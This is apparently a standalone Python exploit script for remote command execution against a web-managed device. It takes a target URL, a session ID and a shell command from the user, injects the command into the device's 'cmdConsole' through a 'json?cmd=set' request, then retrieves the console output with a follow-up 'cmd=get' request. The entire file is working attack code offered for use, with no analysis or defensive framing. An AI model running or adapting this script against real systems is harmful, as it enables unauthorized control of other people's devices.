import requests
import json

sess_id = str(input("Enter the tatget sess_id : "))
target =  str(input("Enter the tatget url end with / : "))
cmd =   str(input("Enter the command : "))

url = f"{target}json?cmd=set&sess={sess_id}"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "text/plain",
    "Origin": "null",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1"
}
data = '{1,"web","cmdConsole","'+cmd+'"}'

response = requests.post(url, headers=headers, data=data)

print(response.status_code)
print(response.text)
if response.status_code == 200:
    try:
        json_data = response.json()
        if json_data == {"qryResult": "1"}:
            url = f"{target}json?cmd=get&sess={sess_id}"
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Content-Type": "text/plain",
                "Origin": "null",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1"
            }
            data = '{3,3349744186(2136),1989675287(1),829730676(3),LOG(438)}'

            response = requests.post(url, headers=headers, data=data)
            json_data = response.json()
            print(response.status_code)
            print(json_data.get("staConsole", "Key not found"))
        else:
            print("Response does not match expected value.")
    except json.JSONDecodeError:
        print("Failed to parse JSON response.")
else:
    print(f"Request failed with status code {response.status_code}")



